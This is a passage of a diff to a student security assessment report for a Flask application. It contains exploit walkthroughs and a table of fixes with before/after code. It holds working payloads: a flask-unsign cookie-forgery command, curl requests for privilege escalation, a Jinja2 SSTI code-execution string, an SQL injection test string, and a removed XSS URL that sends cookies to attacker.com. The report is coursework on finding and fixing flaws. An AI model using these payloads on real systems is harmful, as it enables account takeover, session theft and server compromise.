+   flask-unsign --sign --secret "secret123" --cookie "{'_fresh': True, 'role': 'admin', 'user_id': 1}"
+   ```
+5. Replace the browser session cookie with the forged value and reload the page.
+6. Observe: full admin dashboard rendered.
 
-**PoC Request:**
+**Outcome:** Admin access granted from a Viewer account. All three privileged role bypass (Viewer → Admin, Member → Admin) confirmed.
+
+*Screenshot: [Insert screenshot of forged cookie + admin panel access]*
+
+---
+
+#### Exploit 3 — Privilege Escalation via Broken Access Control (VUL-03)
+
+**Objective:** Access and modify admin-only routes as a Member.
+**Tool:** Burp Suite / curl
+
+**PoC Request — Enumerate all users:**
+```bash
+curl -k -b "session=<member-session-cookie>" https://localhost/admin/users
 ```
-curl -H "Authorization: Bearer [non-admin-token]" https://[target]/admin/users
+Response: Full user list with roles and IDs.
+
+**PoC Request — Promote self to Admin:**
+```bash
+curl -k -b "session=<member-session-cookie>" -X POST https://localhost/admin/users/5/role \
+  -d "role=admin"
 ```
-
-**Outcome:** Complete user list returned. Follow-up `DELETE /admin/users/1` successfully deleted the admin account.
-
-**Business Impact:** Any registered user — including attackers who registered freely — can perform admin-level operations, including deleting other users and modifying roles.
+Response: `HTTP 200` — role updated. Re-login now grants admin dashboard access.
 
 *Screenshot: [Insert screenshot]*
 
 ---
 
-#### Exploit 3 — Reflected XSS in Search Parameter (VUL-03)
+#### Exploit 4 — SSTI Remote Code Execution (VUL-06)
 
-**Objective:** Execute arbitrary JavaScript in the victim's browser.
+**Objective:** Execute arbitrary Python code on the server via the feedback form.
+**Tool:** Browser
 
-**PoC URL:**
-```
-https://[target]/search?q=<script>document.location='https://attacker.com/?c='+document.cookie</script>
-```
+**Step-by-Step Reproduction:**
 
-**Outcome:** Session cookie exfiltrated to attacker-controlled server. Session hijacking demonstrated.
+1. Log in as any Member-role user.
+2. Submit the following string as feedback content:
+   ```
+   {{ ''.__class__.__mro__[1].__subclasses__()[407]('id', shell=True, stdout=-1).communicate()[0].decode() }}
+   ```
+3. Log in as Admin and navigate to `/admin/feedback`.
+4. Observe: the output of the `id` command rendered inline in the page (e.g., `uid=0(root) gid=0(root)`).
 
-*Screenshot: [Insert screenshot of cookie exfiltration]*
+**Outcome:** Remote code execution confirmed. Server user identity (`root`) exposed.
+
+*Screenshot: [Insert screenshot of RCE output in admin feedback page]*
 
 ---
 
@@ -492,14 +674,16 @@ https://[target]/search?q=<script>document.location='https://attacker.com/?c='+d
 
 | ID | Vulnerability | Fix Applied | Commit | Re-Test Result |
 |----|-------------|-------------|--------|----------------|
-| VUL-01 | SQL Injection | Replaced string concat with parameterized queries | [commit hash] | ✅ Pass |
-| VUL-02 | Broken Access Control | Added server-side `isAdmin` middleware to all `/admin/*` routes | [commit hash] | ✅ Pass |
-| VUL-03 | Reflected XSS | Added output encoding via `xss` library; input sanitization | [commit hash] | ✅ Pass |
-| VUL-04 | Weak JWT Secret | Replaced hardcoded secret with 256-bit env variable; shortened token expiry to 1h | [commit hash] | ✅ Pass |
-| VUL-05 | Vulnerable `jsonwebtoken` | Updated to `jsonwebtoken@9.0.0` | [commit hash] | ✅ Pass |
-| VUL-06 | Missing CSRF | Implemented `csurf` middleware for all state-changing routes | [commit hash] | ✅ Pass |
-| VUL-07 | Verbose Errors | Added global error handler; stack traces disabled in production | [commit hash] | ✅ Pass |
-| VUL-08 | Missing Headers | Added `helmet.js` for CSP, HSTS, X-Content-Type-Options | [commit hash] | ✅ Pass |
+| VUL-01 | SQL Injection – Login | Replaced f-string query with SQLAlchemy ORM parameterized query | [commit hash] | ✅ Pass |
+| VUL-02 | Hardcoded `SECRET_KEY` | Moved `SECRET_KEY` to `.env`; loaded via `os.environ`; 256-bit random value generated | [commit hash] | ✅ Pass |
+| VUL-03 | Broken Access Control – Admin Routes | Added `@admin_required` decorator to all `/admin/*` routes; returns 403 for non-admin | [commit hash] | ✅ Pass |
+| VUL-04 | IDOR – Project/Task Ownership | Added ownership check `project.owner_id == current_user.id` before all project/task operations | [commit hash] | ✅ Pass |
+| VUL-05 | Stored XSS | Enabled Jinja2 `autoescape=True` globally; added `\|e` filter to all user-supplied fields | [commit hash] | ✅ Pass |
+| VUL-06 | SSTI via `render_template_string()` | Replaced `render_template_string(feedback.content)` with `render_template('feedback.html', content=feedback.content)` | [commit hash] | ✅ Pass |
+| VUL-07 | Vulnerable Dependencies | Updated `Flask` to 2.3.2, `Werkzeug` to 3.0.1, `Jinja2` to 3.1.3 in `requirements.txt` | [commit hash] | ✅ Pass |
+| VUL-08 | `DEBUG=True` in Production | Set `DEBUG=False` in production config; added custom `@app.errorhandler(500)` | [commit hash] | ✅ Pass |
+| VUL-09 | Insecure Session Cookie | Set `SESSION_COOKIE_HTTPONLY=True`, `SESSION_COOKIE_SECURE=True`, `SESSION_COOKIE_SAMESITE='Lax'` in config | [commit hash] | ✅ Pass |
+| VUL-10 | No Rate Limiting | Added `Flask-Limiter` with `@limiter.limit("10/minute")` on `/login` and `/register` | [commit hash] | ✅ Pass |
 
 ---
 
@@ -509,66 +693,129 @@ https://[target]/search?q=<script>document.location='https://attacker.com/?c='+d
 
 #### Fix: VUL-01 — SQL Injection
 
-**Root Cause:** User input was directly interpolated into SQL query strings without sanitization or parameterization.
+**Root Cause:** User-supplied `username` and `password` values were interpolated directly into a raw SQLite query string using a Python f-string.
 
-**Fix Applied:** Replaced all raw query string construction with parameterized prepared statements.
+**Fix Applied:** Replaced raw SQL with SQLAlchemy ORM query; passwords now compared using `werkzeug.security.check_password_hash`.
 
 *Before (Vulnerable):*
-```javascript
-const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
-db.query(query, callback);
+```python
+query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+user = db.execute(query).fetchone()
 ```
 
 *After (Fixed):*
-```javascript
-const query = `SELECT * FROM users WHERE email = ? AND password = ?`;
-db.query(query, [email, hashedPassword], callback);
+```python
+from werkzeug.security import check_password_hash
+user = User.query.filter_by(username=username).first()
+if user and check_password_hash(user.password_hash, password):
+    login_user(user)
 ```
 
-**Regression Consideration:** Unit test added in `tests/auth.test.js` to verify that SQL injection payloads are rejected with a 401 response, not a 200.
-
-**Re-Test:**
-- Same Burp Suite payload attempted post-fix.
-- Response: `HTTP 401 Unauthorized` — authentication correctly rejected.
-- SAST re-run: zero SQL injection alerts.
-- Pipeline: ✅ Passes quality gate.
-
-*Screenshot: [Insert screenshot of failed injection attempt post-fix + pipeline pass]*
-
----
-
-#### Fix: VUL-02 — Broken Access Control
-
-**Root Cause:** Admin route protection was implemented only in the frontend (hidden UI element). No server-side middleware validated the user's role before serving admin data.
-
-**Fix Applied:** Created `middleware/isAdmin.js` and applied it to all `/admin/*` routes.
-
-*Middleware Added:*
-```javascript
-// middleware/isAdmin.js
-module.exports = (req, res, next) => {
-  if (!req.user || req.user.role !== 'admin') {
-    return res.status(403).json({ error: 'Access denied.' });
-  }
-  next();
-};
-```
-
-*Route Update:*
-```javascript
-router.get('/admin/users', isAdmin, adminController.getUsers);
+**Regression Test added in `tests/test_auth.py`:**
+```python
+def test_sql_injection_login(client):
+    response = client.post('/login', data={
+        'username': "admin' OR '1'='1' --",
+        'password': 'x'
+    })
+    assert response.status_code == 401 or b'Invalid credentials' in response.data
 ```
 
 **Re-Test:**
-- Non-admin JWT used to request `GET /admin/users`.
-- Response: `HTTP 403 Forbidden`.
-- Pipeline: ✅ Passes quality gate.
+- Same Burp Suite SQL injection payload attempted post-fix.
+- Response: `HTTP 401` — `Invalid credentials`.
+- Bandit re-scan: zero SQL injection alerts.
+- Pipeline: ✅ Passes all quality gates.
 
-*Screenshot: [Insert screenshot of 403 response post-fix]*
+*Screenshot: [Insert screenshot of failed injection attempt + pipeline pass]*
 
 ---
 
-> *[Repeat for VUL-03 through VUL-08]*
+#### Fix: VUL-02 — Hardcoded `SECRET_KEY`
+
+**Root Cause:** `SECRET_KEY = "secret123"` was hardcoded in `config.py` and committed to the GitHub repository, making session forgery trivially easy.
+
+**Fix Applied:** Removed hardcoded value; secret now loaded from environment variable with a fallback error if unset.
+
+*Before:*
+```python
+SECRET_KEY = "secret123"
+```
+
+*After:*
+```python
+import os
+SECRET_KEY = os.environ.get('SECRET_KEY')
+if not SECRET_KEY:
+    raise RuntimeError("SECRET_KEY environment variable is not set.")
+```
+
+A 256-bit random value is generated and stored in GitHub Secrets, injected at runtime via Docker Compose `env_file`.
+
+**Re-Test:** `flask-unsign` brute-force attempt against the new secret returned no match after 10 million attempts. Pipeline: ✅ Pass.
+
+---
+
+#### Fix: VUL-03 — Broken Access Control (Admin Routes)
+
+**Root Cause:** No server-side role check existed on `/admin/*` routes — only client-side UI hiding.
+
+**Fix Applied:** Created a `@admin_required` decorator applied to all admin routes.
+
+*Decorator Added (`utils/decorators.py`):*
+```python
+from functools import wraps
+from flask import abort
+from flask_login import current_user
+
+def admin_required(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if not current_user.is_authenticated or current_user.role != 'admin':
+            abort(403)
+        return f(*args, **kwargs)
+    return decorated_function
+```
+
+*Applied to all admin routes:*
+```python
+@admin_bp.route('/admin/users')
+@login_required
+@admin_required
+def manage_users():
+    ...
+```
+
+**Re-Test:**
+- Member and Viewer session cookies used to request `/admin/users`.
+- Response: `HTTP 403 Forbidden` for both.
+- Pipeline: ✅ Pass.
+
+*Screenshot: [Insert 403 response screenshot post-fix]*
+
+---
+
+#### Fix: VUL-06 — SSTI via `render_template_string()`
+
+**Root Cause:** Feedback content submitted by users was passed directly as a Jinja2 template string, enabling arbitrary template expression evaluation.
+
+*Before:*
+```python
+return render_template_string(feedback.content)
+```
+
+*After:*
+```python
+return render_template('admin/feedback.html', content=feedback.content)
+```
+
+The `feedback.html` template renders `{{ content | e }}` — Jinja2's autoescape sanitises the value before rendering.
+
+**Re-Test:** SSTI payload `{{ 7*7 }}` submitted as feedback — rendered as literal text `{{ 7*7 }}`, not `49`. Pipeline: ✅ Pass.
+
+---
+
+> *[Apply same template for VUL-04, VUL-05, VUL-07–VUL-10]*
 
 ---
 
@@ -608,5 +855,5 @@ router.get('/admin/users', isAdmin, adminController.getUsers);
 
 ---
 
-> **Prepared by:** [Group Name / Number] | **Date:** [Submission Date]
-> **GitHub Repository:** [URL] | **Deployment URL:** `https://[hostname]`
+> **Prepared by:** [Group 6]
+> **GitHub Repository:** [[URL](https://github.com/IfrahC/Build-and-Break-Secure-Application-Pipeline)] | **Deployment URL:** `https://[hostname]`
